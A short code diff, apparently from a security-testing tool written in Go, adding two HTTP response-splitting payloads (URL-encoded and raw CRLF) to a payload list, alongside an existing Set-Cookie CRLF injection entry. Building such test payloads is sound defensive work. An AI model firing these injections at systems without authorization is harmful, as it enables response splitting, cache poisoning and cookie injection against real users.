@@ -249,6 +249,22 @@ var allPayloads = []Payload{
 		InjectedHeader: "Content-Type",
 	},
 
+	// WSTG-INPV-16: HTTP response splitting — full second-response injection
+	{
+		Value:          "%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0aSplitResponse",
+		InjectionType:  InjectionResponseSplit,
+		EncodingType:   EncodingURL,
+		Description:    "Full HTTP response split (WSTG-INPV-16)",
+		InjectedHeader: "",
+	},
+	{
+		Value:          "\r\nHTTP/1.1 200 OK\r\nContent-Type:text/html\r\n\r\nSplitResponse",
+		InjectionType:  InjectionResponseSplit,
+		EncodingType:   EncodingNone,
+		Description:    "Raw CRLF response split",
+		InjectedHeader: "",
+	},
+
 	// Mixed encoding
 	{
 		Value:          "%0D%0ASet-Cookie:crlf=injection",
